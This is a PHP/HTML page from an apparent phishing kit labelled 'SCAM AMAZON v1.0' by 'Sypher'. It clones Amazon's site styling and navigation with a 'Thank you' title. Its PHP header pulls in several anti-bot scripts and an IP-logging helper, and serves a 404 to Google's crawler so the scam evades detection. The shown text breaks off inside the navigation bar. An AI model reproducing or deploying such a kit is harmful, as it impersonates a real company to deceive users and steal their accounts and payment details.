<?php
   /*   
   
        ───────────────────────────────────────────────────────────────────────────────────────────────────
        ─██████████████─████████──████████─██████████████─██████──██████─██████████████─████████████████───
        ─██░░░░░░░░░░██─██░░░░██──██░░░░██─██░░░░░░░░░░██─██░░██──██░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───
        ─██░░██████████─████░░██──██░░████─██░░██████░░██─██░░██──██░░██─██░░██████████─██░░████████░░██───
        ─██░░██───────────██░░░░██░░░░██───██░░██──██░░██─██░░██──██░░██─██░░██─────────██░░██────██░░██───
        ─██░░██████████───████░░░░░░████───██░░██████░░██─██░░██████░░██─██░░██████████─██░░████████░░██───
        ─██░░░░░░░░░░██─────████░░████─────██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───
        ─██████████░░██───────██░░██───────██░░██████████─██░░██████░░██─██░░██████████─██░░██████░░████───
        ─────────██░░██───────██░░██───────██░░██─────────██░░██──██░░██─██░░██─────────██░░██──██░░██─────
        ─██████████░░██───────██░░██───────██░░██─────────██░░██──██░░██─██░░██████████─██░░██──██░░██████─
        ─██░░░░░░░░░░██───────██░░██───────██░░██─────────██░░██──██░░██─██░░░░░░░░░░██─██░░██──██░░░░░░██─
        ─██████████████───────██████───────██████─────────██████──██████─██████████████─██████──██████████─
        ───────────────────────────────────────────────────────────────────────────────────────────────────
   ───────────────────────────────────────────────────────────────────────────────────────────────────────────────
   ─██████████████─██████──────────██████─██████████████─██████████████████─██████████████─██████──────────██████─
   ─██░░░░░░░░░░██─██░░██████████████░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░░░██─██░░░░░░░░░░██─██░░██████████──██░░██─
   ─██░░██████░░██─██░░░░░░░░░░░░░░░░░░██─██░░██████░░██─████████████░░░░██─██░░██████░░██─██░░░░░░░░░░██──██░░██─
   ─██░░██──██░░██─██░░██████░░██████░░██─██░░██──██░░██─────────████░░████─██░░██──██░░██─██░░██████░░██──██░░██─
   ─██░░██████░░██─██░░██──██░░██──██░░██─██░░██████░░██───────████░░████───██░░██──██░░██─██░░██──██░░██──██░░██─
   ─██░░░░░░░░░░██─██░░██──██░░██──██░░██─██░░░░░░░░░░██─────████░░████─────██░░██──██░░██─██░░██──██░░██──██░░██─
   ─██░░██████░░██─██░░██──██████──██░░██─██░░██████░░██───████░░████───────██░░██──██░░██─██░░██──██░░██──██░░██─
   ─██░░██──██░░██─██░░██──────────██░░██─██░░██──██░░██─████░░████─────────██░░██──██░░██─██░░██──██░░██████░░██─
   ─██░░██──██░░██─██░░██──────────██░░██─██░░██──██░░██─██░░░░████████████─██░░██████░░██─██░░██──██░░░░░░░░░░██─
   ─██░░██──██░░██─██░░██──────────██░░██─██░░██──██░░██─██░░░░░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██████████░░██─
   ─██████──██████─██████──────────██████─██████──██████─██████████████████─██████████████─██████──────────██████─
   ───────────────────────────────────────────────────────────────────────────────────────────────────────────────               
                                            #=======================#
                                            #   SCAM AMAZON v1.0    #
                                            #    SYPHER.AMAZON      #
                                            #=======================#
                             ─────────────────────────────────────────────────────────
                             ─██████████████─██████████████─████████───██████████████─
                             ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░██───██░░░░░░░░░░██─
                             ─██████████░░██─██░░██████░░██─████░░██───██░░██████░░██─
                             ─────────██░░██─██░░██──██░░██───██░░██───██░░██──██░░██─
                             ─██████████░░██─██░░██──██░░██───██░░██───██░░██████░░██─
                             ─██░░░░░░░░░░██─██░░██──██░░██───██░░██───██░░░░░░░░░░██─
                             ─██░░██████████─██░░██──██░░██───██░░██───██░░██████░░██─
                             ─██░░██─────────██░░██──██░░██───██░░██───██░░██──██░░██─
                             ─██░░██████████─██░░██████░░██─████░░████─██░░██████░░██─
                             ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░██─██░░░░░░░░░░██─
                             ─██████████████─██████████████─██████████─██████████████─
                             ─────────────────────────────────────────────────────────
   
   */
   
   session_start();
   error_reporting(0);
   ##################### SECOND FILES #####################
   include('../functions/get_lang_en.php'); 
   include('../functions/get_ip.php'); 
   include "../../antibots/antibots1.php";
   include "../../antibots/antibots2.php";
   include "../../antibots/antibots3.php";
   include "../../antibots/antibots4.php";
   include "../../antibots/antibots5.php";
   include "../../antibots/antibots6.php";
   //----------------------------------------------------------------------------------------------------------------//
   if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
   if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
   //----------------------------------------------------------------------------------------------------------------//
   ?>
<!doctype html>
<html>
   <head>
      <meta charset="utf-8">
      <title dir="ltr">&#x54;&#x68;&#x61;&#x6E;&#x6B;&#x20;&#x79;&#x6F;&#x75;</title>
      <!---------------------------------- FILE ICON ------------------------------------->
      <link rel="shortcut icon" type="image/x-icon" href="../data/icon/favicon.ico">
      <!---------------------------------------------------------------------------------->	 
      <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/61hpgixl7UL._RC|01evdoiemkL.css,01K+Ps1DeEL.css,31yErFkQitL.css,11PuQQlCaSL.css,11UGC+GXOPL.css,21LK7jaicML.css,11L58Qpo0GL.css,21EuGTxgpoL.css,01Xl9KigtzL.css,21GwE3cR-yL.css,019SHZnt8RL.css,01FZwtpqhsL.css,11vZhCgAHbL.css,21Mne54CsmL.css,11WgRxUdJRL.css,01dU8+SPlFL.css,11DGn6WmpTL.css,01SHjPML6tL.css,111-D2qRjiL.css,01QrWuRrZ-L.css,31WnKks7R1L.css,114KWZGKCVL.css,01cbS3UK11L.css,21zId9c5Z5L.css,01cNnXK5MbL.css,11pPpHypVXL.css_.css?AUIClients/AmazonUI#us.not-trident" />
      <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/21ihve3CuSL.css?AUIClients/YourAccountAddressBookAssets" />
      <script>
         (function(g,h,K,la){function V(a){t&&t.tag&&t.tag(q(":","aui",a))}function v(a,b){t&&t.count&&t.count("aui:"+a,0===b?0:b||(t.count("aui:"+a)||0)+1)}function m(a){try{return a.test(navigator.userAgent)}catch(b){return!1}}function w(a,b,c){a.addEventListener?a.addEventListener(b,c,!1):a.attachEvent&&a.attachEvent("on"+b,c)}function q(a,b,c,e){b=b&&c?b+a+c:b||c;return e?q(a,b,e):b}function B(a,b,c){try{Object.defineProperty(a,b,{value:c,writable:!1})}catch(e){a[b]=c}return c}function L(){return setTimeout(W,
         0)}function ma(a,b){var c=a.length,e=c,f=function(){e--||(M.push(b),N||(L(),N=!0))};for(f();c--;)X[a[c]]?f():(x[a[c]]=x[a[c]]||[]).push(f)}function na(a,b,c,e,f){var d=h.createElement(a?"script":"link");w(d,"error",e);f&&w(d,"load",f);if(a){d.type="text/javascript";d.async=!0;if(a=c)a=-1!==b.indexOf("images/I")||/AUIClients/.test(b);a&&d.setAttribute("crossorigin","anonymous");d.src=b}else d.rel="stylesheet",d.href=b;h.getElementsByTagName("head")[0].appendChild(d)}function Y(a,b){function c(c,e){function f(){na(b,
         c,h,function(b){!C&&h?(h=!1,v("resource_retry"),f()):(v("resource_error"),a.log("Asset failed to load: "+c,C?"WARN":void 0));b&&b.stopPropagation?b.stopPropagation():g.event&&(g.event.cancelBubble=!0)},e)}if(Z[c])return!1;Z[c]=!0;v("resource_count");var h=!0;return!f()}if(b){var e=0,f=0;c.andConfirm=function(a,b){return c(a,function(){e++;b&&b.apply(this,arguments)})};c.confirm=function(){f++};c.getCsriCounters=function(){return{reqs:e,full:f}}}return c}function oa(a,b,c){for(var e={name:a,guard:function(c){return b.guardFatal(a,
         c)},logError:function(c,d,e){b.logError(c,d,e,a)}},f=[],d=0;d<c.length;d++)D.hasOwnProperty(c[d])&&(f[d]=O.hasOwnProperty(c[d])?O[c[d]](D[c[d]],e):D[c[d]]);return f}function y(a,b,c,e,f){return function(d,h){function l(){var a=null;e?a=h:"function"===typeof h&&(p.start=z(),a=h.apply(g,oa(d,k,m)),p.end=z());if(b){D[d]=a;a=d;for(X[a]=!0;(x[a]||[]).length;)x[a].shift()();delete x[a]}p.done=!0}var k=f||this;"function"===typeof d&&(h=d,d=void 0);b&&(d=(d||"__NONAME__").replace(/^prv:/,""),P.hasOwnProperty(d)&&
         k.error(q(", reregistered by ",q(" by ",d+" already registered",P[d]),k.attribution),d),P[d]=k.attribution);for(var m=[],n=0;n<a.length;n++)m[n]=a[n].replace(/^prv:/,"");var p=aa[d||"anon"+ ++pa]={depend:m,registered:z(),namespace:k.namespace};c?l():ma(m,k.guardFatal(d,l));return{decorate:function(a){O[d]=k.guardFatal(d,a)}}}}function ba(a){return function(){var b=Array.prototype.slice.call(arguments);return{execute:y(b,!1,a,!1,this),register:y(b,!0,a,!1,this)}}}function Q(a,b){return function(c,
         e){e||(e=c,c=void 0);var f=this.attribution;return function(){u.push(b||{attribution:f,name:c,logLevel:a});var d=e.apply(this,arguments);u.pop();return d}}}function E(a,b){this.load={js:Y(this,!0),css:Y(this)};B(this,"namespace",b);B(this,"attribution",a)}function ca(){h.body?n.trigger("a-bodyBegin"):setTimeout(ca,20)}function A(a,b){if(b){for(var c=a.className.split(" "),e=c.length;e--;)if(c[e]===b)return;a.className+=" "+b}}function da(a,b){for(var c=a.className.split(" "),e=[],f;void 0!==(f=c.pop());)f&&
         f!==b&&e.push(f);a.className=e.join(" ")}function ea(a){try{return a()}catch(b){return!1}}function F(){if(G){var a=g.innerWidth?{w:g.innerWidth,h:g.innerHeight}:{w:k.clientWidth,h:k.clientHeight};5<Math.abs(a.w-R.w)||50<a.h-R.h?(R=a,H=4,(a=l.mobile||l.tablet?450<a.w&&a.w>a.h:1250<=a.w)?A(k,"a-ws"):da(k,"a-ws")):0<H&&(H--,fa=setTimeout(F,16))}}function qa(a){(G=void 0===a?!G:!!a)&&F()}function ra(){return G}"use strict";var I=K.now=K.now||function(){return+new K},z=function(a){return a&&a.now?a.now.bind(a):
         I}(g.performance);la=z();var p=g.AmazonUIPageJS||g.P;if(p&&p.when&&p.register)throw Error("A copy of P has already been loaded on this page.");var t=g.ue;V();V("aui_build_date:3.18.9-2018-06-12");var M=[],N=!1,W;W=function(){for(var a=L(),b=I();M.length;)if(M.shift()(),50<I()-b)return;clearTimeout(a);N=!1};m(/OS 6_[0-9]+ like Mac OS X/i)&&w(g,"scroll",L);var X={},x={},Z={},C=!1;w(g,"beforeunload",function(){C=!0;setTimeout(function(){C=!1},1E4)});var P={},D={},O={},aa={},pa=0,S,u=[],ga=g.onerror;
         g.onerror=function(a,b,c,e,f){f&&"object"===typeof f||(f=Error(a,b,c),f.columnNumber=e,f.stack=b||c||e?q(String.fromCharCode(92),f.message,"at "+q(":",b,c,e)):void 0);var d=u.pop()||{};f.attribution=q(":",f.attribution||d.attribution,d.name);f.logLevel=d.logLevel;f.attribution&&console&&console.log&&console.log([f.logLevel||"ERROR",a,"thrown by",f.attribution].join(" "));u=[];ga&&(d=[].slice.call(arguments),d[4]=f,ga.apply(g,d))};E.prototype={logError:function(a,b,c,e){b={message:b,logLevel:c||"ERROR",
         attribution:q(":",this.attribution,e)};if(g.ueLogError)return g.ueLogError(a||b,a?b:null),!0;console&&console.error&&(console.log(b),console.error(a));return!1},error:function(a,b,c,e){a=Error(q(":",e,a,c));a.attribution=q(":",this.attribution,b);throw a;},guardError:Q(),guardFatal:Q("FATAL"),guardCurrent:function(a){var b=u[u.length-1];return b?Q(b.logLevel,b).call(this,a):a},log:function(a,b,c){return this.logError(null,a,b,c)},declare:y([],!0,!0,!0),register:y([],!0),execute:y([]),AUI_BUILD_DATE:"3.18.9-2018-06-12",
         when:ba(),now:ba(!0),trigger:function(a,b,c){var e=I();this.declare(a,{data:b,pageElapsedTime:e-(g.aPageStart||NaN),triggerTime:e});c&&c.instrument&&S.when("prv:a-logTrigger").execute(function(b){b(a)})},handleTriggers:function(){this.log("handleTriggers deprecated")},attributeErrors:function(a){return new E(a)},_namespace:function(a,b){return new E(a,b)}};var n=B(g,"AmazonUIPageJS",new E);S=n._namespace("PageJS","AmazonUI");S.declare("prv:p-debug",aa);n.declare("p-recorder-events",[]);n.declare("p-recorder-stop",
         function(){});B(g,"P",n);ca();if(h.addEventListener){var ha;h.addEventListener("DOMContentLoaded",ha=function(){n.trigger("a-domready");h.removeEventListener("DOMContentLoaded",ha,!1)},!1)}var k=h.documentElement,T=function(){var a=["O","ms","Moz","Webkit"],b=h.createElement("div");return{testGradients:function(){b.style.cssText="background-image:-webkit-gradient(linear,left top,right bottom,from(#9f9),to(white));background-image:-webkit-linear-gradient(left top,#9f9,white);background-image:linear-gradient(left top,#9f9,white);";
         return-1<b.style.backgroundImage.indexOf("gradient")},test:function(c){var e=c.charAt(0).toUpperCase()+c.substr(1);c=(a.join(e+" ")+e+" "+c).split(" ");for(e=c.length;e--;)if(""===b.style[c[e]])return!0;return!1},testTransform3d:function(){var a=!1;g.matchMedia&&(a=g.matchMedia("(-webkit-transform-3d)").matches);return a}}}(),p=k.className,ia=/(^| )a-mobile( |$)/.test(p),ja=/(^| )a-tablet( |$)/.test(p),l={audio:function(){return!!h.createElement("audio").canPlayType},video:function(){return!!h.createElement("video").canPlayType},
         canvas:function(){return!!h.createElement("canvas").getContext},svg:function(){return!!h.createElementNS&&!!h.createElementNS("http://www.w3.org/2000/svg","svg").createSVGRect},offline:function(){return navigator.hasOwnProperty&&navigator.hasOwnProperty("onLine")&&navigator.onLine},dragDrop:function(){return"draggable"in h.createElement("span")},geolocation:function(){return!!navigator.geolocation},history:function(){return!(!g.history||!g.history.pushState)},webworker:function(){return!!g.Worker},
         autofocus:function(){return"autofocus"in h.createElement("input")},inputPlaceholder:function(){return"placeholder"in h.createElement("input")},textareaPlaceholder:function(){return"placeholder"in h.createElement("textarea")},localStorage:function(){return"localStorage"in g&&null!==g.localStorage},orientation:function(){return"orientation"in g},touch:function(){return"ontouchend"in h},gradients:function(){return T.testGradients()},hires:function(){var a=g.devicePixelRatio&&1.5<=g.devicePixelRatio||
         g.matchMedia&&g.matchMedia("(min-resolution:144dpi)").matches;v("hiRes"+(ia?"Mobile":ja?"Tablet":"Desktop"),a?1:0);return a},transform3d:function(){return T.testTransform3d()},touchScrolling:function(){return m(/Windowshop|android.([3-9]|[L-Z])|OS ([5-9]|[1-9][0-9]+)(_[0-9]{1,2})+ like Mac OS X|Chrome|Silk|Firefox|Trident.+?; Touch/i)},ios:function(){return m(/OS [1-9][0-9]*(_[0-9]*)+ like Mac OS X/i)&&!m(/trident|Edge/i)},android:function(){return m(/android.([1-9]|[L-Z])/i)&&!m(/trident|Edge/i)},
         mobile:function(){return ia},tablet:function(){return ja}},r;for(r in l)l.hasOwnProperty(r)&&(l[r]=ea(l[r]));for(var U="textShadow textStroke boxShadow borderRadius borderImage opacity transform transition".split(" "),J=0;J<U.length;J++)l[U[J]]=ea(function(){return T.test(U[J])});var G=!0,fa=0,R={w:0,h:0},H=4;F();w(g,"resize",function(){clearTimeout(fa);H=4;F()});var ka={getItem:function(a){try{return g.localStorage.getItem(a)}catch(b){}},setItem:function(a,b){try{return g.localStorage.setItem(a,
         b)}catch(c){}}};da(k,"a-no-js");A(k,"a-js");!m(/OS [1-8](_[0-9]*)+ like Mac OS X/i)||g.navigator.standalone||m(/safari/i)||A(k,"a-ember");p=[];for(r in l)l.hasOwnProperty(r)&&l[r]&&p.push("a-"+r.replace(/([A-Z])/g,function(a){return"-"+a.toLowerCase()}));A(k,p.join(" "));k.setAttribute("data-aui-build-date","3.18.9-2018-06-12");n.register("p-detect",function(){return{capabilities:l,localStorage:l.localStorage&&ka,toggleResponsiveGrid:qa,responsiveGridEnabled:ra}});m(/UCBrowser/i)||l.localStorage&&
         A(k,ka.getItem("a-font-class"));n.declare("a-event-revised-handling",!1);n.declare("a-fix-event-off",!1);v("pagejs:pkgExecTime",z()-NaN)})(window,document,Date);
           (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/61ea4y7yPdL._RC|11IYhapguOL.js,61qh3f4mB7L.js,21iSNz47xoL.js,012FVc3131L.js,31KE7boYKEL.js,31yRaEj-EtL.js,51rqb0nVCNL.js,11AHlQhPRjL.js,01xMsWWFUQL.js,11CYRXogq+L.js,116tgw9TSaL.js,21auxuI+dRL.js,01PoLXBDXWL.js,61fdakuKr7L.js,01mi-J86cyL.js,110HZneHcZL.js,31Fwa3IMfsL.js,01rpauTep4L.js,11JJQC-EglL.js,018o4gN0xzL.js_.js?AUIClients/AmazonUI');
           (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/11kbKxV0uFL.js?AUIClients/YourAccountAddressBookAssets');
      </script>
      <style>.nav-sprite-v1 .nav-sprite, .nav-sprite-v1 .nav-icon {
         background-image: url(https://m.media-amazon.com/images/G/01/gno/sprites/nav-sprite-global_bluebeacon-V3-1x_optimized._CB474516462_.png);
         background-position: 0 1000px;
         background-repeat: repeat-x;
         }
         .nav-spinner {
         background-image: url(https://m.media-amazon.com/images/G/01/javascripts/lib/popover/images/snake._CB192571611_.gif);
         background-position: center center;
         background-repeat: no-repeat;
         }
         .nav-timeline-icon, .nav-access-image, .nav-timeline-prime-icon {
         background-image: url(https://m.media-amazon.com/images/G/01/gno/sprites/timeline_sprite_1x._CB276239408_.png);
         background-repeat: no-repeat;
         }
      </style>
      <!--  -->
      <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/71kZ1kXNgdL._RC|11qlbytjBCL.css,31IWMxDWXBL.css,21Wyw4UJQLL.css,31TMzWTidCL.css,11S8GiSgx9L.css,31UlxNhlUML.css,01XHMOHpK1L.css_.css?AUIClients/NavDesktopMetaAsset#desktop" />
      <!-- From remote config v3-->
      <img src="https://m.media-amazon.com/images/G/01/gno/sprites/nav-sprite-global_bluebeacon-V3-1x_optimized._CB474516462_.png" style="display:none" alt=""/>
      <script>
         (window.AmazonUIPageJS ? AmazonUIPageJS : P).when('navCF').execute(function(){
           (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/01LDbGz%2BRmL._RC|713zrEC5wxL.js,61rg53XLpnL.js,01JS2B6NLKL.js,41y6KlbPBLL.js,01FweAqXd9L.js,01wBjiz9OvL.js,21vYtu6vTJL.js,31luYV1y5NL.js,51RgqN98m2L.js,31kByMCr23L.js_.js?AUIClients/NavDesktopMetaAsset#desktop');
         });
      </script>
      <style mark='aboveNavInjectionCSS' type='text/css'>div#navSwmHoliday.nav-focus {border: none;margin: 0;}</style>
      <![if gt IE 6]>
      <noscript>
         <![endif]>
         <style type="text/css">
            <!--
               #navbar #nav-shop .nav-a:hover {
                 color: #ff9900;
                 text-decoration: underline;
               }
               #navbar #nav-search .nav-search-facade,
               #navbar #nav-tools .nav-icon,
               #navbar #nav-shop .nav-icon,
               #navbar #nav-subnav .nav-hasArrow .nav-arrow {
                 display: none;
               }
               #navbar #nav-search .nav-search-submit,
               #navbar #nav-search .nav-search-scope {
                 display: block;
               }
               #nav-search .nav-search-scope {
                 padding: 0 5px;
               }
               #navbar #nav-search .nav-search-dropdown {
                 position: relative;
                 top: 5px;
                 height: 23px;
                 font-size: 14px;
                 opacity: 1;
                 filter: alpha(opacity = 100);
               }
               -->
         </style>
         <![if gt IE 6]>
      </noscript>
      <![endif]>
      <style type="text/css">
         #csr-hcb-wrapper {
         display: none;
         }
         .bia-item .bia-action-button {
         display: inline-block;
         height: 22px;
         margin-top: 3px;
         padding: 0px;
         overflow: hidden;
         text-align: center;
         vertical-align: middle;
         text-decoration: none;
         color: #111;
         font-family: Arial,sans-serif;
         font-size: 11px;
         font-style: normal;
         font-weight: normal;
         line-height: 19px;
         cursor: pointer;
         outline: 0;
         border: 1px solid;
         -webkit-border-radius: 3px 3px 3px 3px;
         -moz-border-radius: 3px 3px 3px 3px;
         border-radius: 3px 3px 3px 3px;
         border-radius: 0\9;
         border-color: #bcc1c8 #bababa #adb2bb;
         background: #eff0f3;
         background: -moz-linear-gradient(top, #f7f8fa, #e7e9ec);
         background: -webkit-gradient(linear, left top, left bottom, color-stop(0%, #f7f8fa), color-stop(100%, #e7e9ec));
         background: -webkit-linear-gradient(top, #f7f8fa, #e7e9ec);
         background: -o-linear-gradient(top, #f7f8fa, #e7e9ec);
         background: -ms-linear-gradient(top, #f7f8fa, #e7e9ec);
         background: linear-gradient(top, #f7f8fa, #e7e9ec);
         filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#f7f8fa', endColorstr='#e7e9ec',GradientType=0);
         *zoom: 1;
         -webkit-box-shadow: inset 0 1px 0 0 #fff;
         -moz-box-shadow: inset 0 1px 0 0 #fff;
         box-shadow: inset 0 1px 0 0 #fff;
         box-sizing: border-box;
         }
         /*related to defect found in YSH page in www.amazon.fr
         font family was overriden causing button overflow on
         that particular page.
         Related SIM: https://issues.amazon.com/issues/P13N-CONSUMABLES-3104
         */
         #bia-hcb-widget .a-button-text {
         font-family: Arial,sans-serif !important;
         }
         /*This class was added to remove star ratings from
         Shared Component's templates. Star ratings are
         currently not configurable. This will work as an
         immediate solution.
         TODO: Work with shared components to make star
         ratings configurable in their Shared View Templates
         */
         #bia_content .a-icon-row {
         display: none;
         }
         #bia-hcb-widget .a-icon-row {
         display: none;
         }
         #bia_content {
         width: 266px;
         }
         .nav-flyout-sidePanel {
         width: 266px !important;
         }
         .aui-atc-button {
         margin-top: 3px;
         overflow: hidden;
         color: #111;
         font-family: Arial,sans-serif;
         font-size: 11px;
         font-style: normal;
         font-weight: normal;
         }
         .bia-item .bia-action-button:hover {
         border-color: #aeb4bd #adadad #9fa5af;
         background: #e0e3e8;
         background: -moz-linear-gradient(top, #e7eaf0, #d9dce1);
         background: -webkit-gradient(linear, left top, left bottom, color-stop(0%, #e7eaf0), color-stop(100%, #d9dce1));
         background: -webkit-linear-gradient(top, #e7eaf0, #d9dce1);
         background: -o-linear-gradient(top, #e7eaf0, #d9dce1);
         background: -ms-linear-gradient(top, #e7eaf0, #d9dce1);
         background: linear-gradient(top, #e7eaf0, #d9dce1);
         filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#e7eaf0', endColorstr='#d9dce1',GradientType=0);
         *zoom: 1;
         -webkit-box-shadow: 0 1px 3px rgba(255, 255, 255, 0.6) inset;
         -moz-box-shadow: 0 1px 3px rgba(255, 255, 255, 0.6) inset;
         box-shadow: 0 1px 3px rgba(255, 255, 255, 0.6) inset;
         }
         .bia-item .bia-action-button:active {
         background-color: #dcdfe3;
         -webkit-box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2) inset;
         -moz-box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2) inset;
         box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2) inset;
         }
         .bia-item .bia-action-button-disabled {
         background: #f7f8fa;
         color: #b7b7b7;
         border-color: #e0e0e0;
         box-shadow: none;
         cursor: default;
         }
         .bia-item .bia-action-button-disabled:hover {
         background: #f7f8fa;
         color: #b7b7b7;
         border-color: #e0e0e0;
         box-shadow: none;
         cursor: default;
         }
         .bia-action-button-inner {
         border-bottom-color: #111111;
         border-bottom-style: none;
         border-bottom-width: 0px;
         border-image-outset: 0px;
         border-image-repeat: stretch;
         border-image-slice: 100%;
         border-image-width: 1;
         border-left-color: #111111;
         border-left-style: none;
         border-left-width: 0px;
         border-right-color: #111111;
         border-right-style: none;
         border-right-width: 0px;
         border-top-color: #111111;
         border-top-style: none;
         border-top-width: 0px;
         box-sizing: border-box;
         display: block;
         height: 20px;
         line-height: 19px;
         overflow: hidden;
         position: relative;
         padding: 0;
         vertical-align: baseline;
         }
         .bia-action-inner {
         border: 0;
         display: inline;
         font-size: 11px;
         height: auto;
         line-height: 19px;
         padding: 0px 4px 0px 4px;
         text-align: center;
         width: auto;
         white-space: nowrap;
         }
         .csr-content {
         font-family: Arial, Verdana, Helvetica, sans-serif;
         width: 220px;
         line-height: 19px;
         }
         .bia-header {
         font-size: 16px;
         color: #E47911;
         padding-bottom: 10px;
         }
         .bia-header-widget {
         white-space: nowrap;
         overflow: hidden;
         }
         .bia-space-right {
         padding-right: 18px;
         white-space: normal;
         float: left;
         }
         .b2b-see-more-link a {
         display: inline;
         float: left;
         margin-top: 3px;
         margin-left: 3px;
         }
         .hcb-see-more-link a {
         color: #333;
         font-size: 13px;
         text-decoration: none;
         font-family: Arial, Verdana, Helvetica, sans-serif;
         }
         .bia-hcb-body {
         overflow: hidden;
         }
         .bia-item {
         width: 220px;
         display: inline-block;
         margin-bottom: 20px;
         }
         .b2b-bia-item {
         width: 299px;
         display: inline-block;
         margin-right: 18px;
         margin-top: 18px;
         vertical-align: top;
         }
         .bia-item-image {
         float: left;
         margin-right: 15px;
         width: 75px;
         height: 75px;
         }
         .b2b-bia-item-image {
         float: left;
         width: 90px;
         height: 90px;
         text-align: center;
         }
         .bia-image {
         max-height: 75px;
         max-width: 75px;
         border: 0;
         }
         .b2b-bia-image {
         max-height: 90px;
         max-width: 90px;
         border: 0;
         }
         .bia-item-data {
         float: left;
         width: 130px;
         }
         .b2b-bia-item-data {
         float: left;
         margin-left: 22px;
         width: 187px;
         }
         .bia-title {
         line-height: 19px;
         font-size: 13px;
         max-height: 60px;
         overflow: hidden;
         }
         .bia-link:link {
         text-decoration: none;
         font-family: Arial, Verdana, Helvetica, sans-serif;
         }
         .bia-link:visited {
         text-decoration: none;
         color: #004B91;
         }
         .bia-price-nav {
         margin-top: -4px;
         color: #800;
         font-size: 12px;
         vertical-align: bottom;
         }
         .bia-price-yorr {
         margin-top: -8px;
         color: #800;
         font-size: 12px;
         vertical-align: bottom;
         }
         .bia-price {
         color: #800;
         font-size: 12px;
         vertical-align: bottom;
         }
         .b2b-bia-price {
         color: #800;
         font-size: 13px;
         vertical-align: bottom;
         }
         .bia-vpc-t1{
         color: #008a00;
         font-size: 12px;
         font-weight: bold;
         }
         .bia-vpc-t2{
         color: #008a00;
         font-size: 12px;
         }
         .bia-vpc-t3{
         font-size: 12px;
         line-height: 20px;
         }
         .bia-vpc-t3-badge{
         color: #ffffff;
         background-color: #e47911;
         font-weight: normal;
         }
         .bia-vpc-t3-badge::before{
         border-bottom: 10px solid #e47911;
         }
         .bia-vpc-t3-badge:after{
         border-top: 10px solid #e47911;
         }
         .bia-ppu {
         color: #800;
         font-size: 10px;
         }
         .bia-prime-badge {
         border: 0;
         vertical-align: middle;
         }
         .bia-cart-action {
         display: none;
         }
         .bia-cart-msg {
         display: block;
         font-family: Arial, Verdana, Helvetica, sans-serif;
         line-height: 19px;
         }
         .bia-cart-icon {
         background-image:
         url("https://images-na.ssl-images-amazon.com/images/G/01/Recommendations/MissionExperience/BIA/bia-atc-confirm-icon._CB327014182_.png");
         display: inline-block;
         width: 14px;
         height: 13px;
         top: 3px;
         line-height: 19px;
         position: relative;
         vertical-align: top;
         }
         .bia-cart-success {
         color: #090!important;
         display: inline-block;
         margin: 0;
         font-size: 13px;
         font-style: normal;
         font-weight: bold;
         font-family: Arial, Verdana, Helvetica, sans-serif;
         }
         .bia-cart-title {
         margin-bottom: 3px;
         }
         .bia-cart-form {
         margin: 0px;
         }
         .b2b-bia-cart-form {
         margin: 3px;
         }
         .bia-inline-cart-form {
         margin: 0px;
         }
         .bia-cart-submit {
         cursor: inherit;
         left: 0;
         top: 0;
         line-height: 19px;
         height: 100%;
         width: 100%;
         padding: 1px 6px 1px 6px;
         position: absolute;
         opacity: 0.01;
         overflow: visible;
         filter: alpha(opacity=1);
         z-index: 20;
         }
         .bia-link-caret {
         color: #e47911;
         }
      </style>
      <style>
         #nav-prime-tooltip{
         padding: 0 20px 2px 20px;
         background-color: white;
         font-family: arial,sans-serif;
         }
         .nav-npt-text-title{
         font-family: arial,sans-serif;
         font-size: 18px;
         font-weight: bold;
         line-height: 21px;
         color: #E47923;
         }
         .nav-npt-text-detail, a.nav-npt-a{
         font-family: arial,sans-serif;
         font-size: 12px;
         line-height: 14px;
         color: #333333;
         margin: 2px 0px;
         }
         a.nav-npt-a {
         text-decoration: underline;
         }
      </style>
   </head>
   <body>
      <div id="a-page">
      <a id="nav-top"></a>
      <div id='nav-upnav' aria-hidden='true' style='background-image: url(https://images-na.ssl-images-amazon.com/images/G/01/airstream/upnav/C/nav_latest_1x._CB474855083_.jpg); background-color: #F6F6F6; text-align: left; background-position: top left; height: 55px; background-repeat: no-repeat; background-size: 1920px; min-width: 1000px;'>
         <a href="#" class="nav-a"><span class="nav-spanAltText"></span></a>
      </div>
      <header class='nav-locale-us nav-lang-en nav-ssl nav-rec nav-opt-sprite'>
         <div id='navbar' role="navigation" class='nav-sprite-v1 nav-bluebeacon nav-packard-glow nav-packard-glow-blacklist'>
            <div id='nav-belt'>
               <div class='nav-left'>
                  <div id='nav-logo'>
                     <a href="#" class='nav-logo-link' tabindex="6">
                     <span class='nav-logo-base nav-sprite'></span>
                     <span class='nav-logo-ext nav-sprite'></span>
                     <span class='nav-logo-locale nav-sprite'></span>
                     </a>
                     <a href="#" aria-label="" tabindex="7" class='nav-logo-tagline nav-sprite nav-prime-try'>
                     <?=$I_23;?>
                     </a>
                  </div>
               </div>
               <div class='nav-right'>
                  <div id='nav-swmslot'>
                     <div id="navSwmHoliday" style="width: 400px; height: 39px; overflow: hidden;position: relative;"><a aria-label='Back to School clothing' href="#" class="nav-imageHref"><img src="https://images-na.ssl-images-amazon.com/images/G/01/img18/events/bts/gw/bts_swm_clothing_400x39_v3._CB473604550_.jpg" border="0" /></a></div>
                  </div>
               </div>
               <div class='nav-fill'>
                  <div id="nav-search">
                     <div id="nav-bar-left"></div>
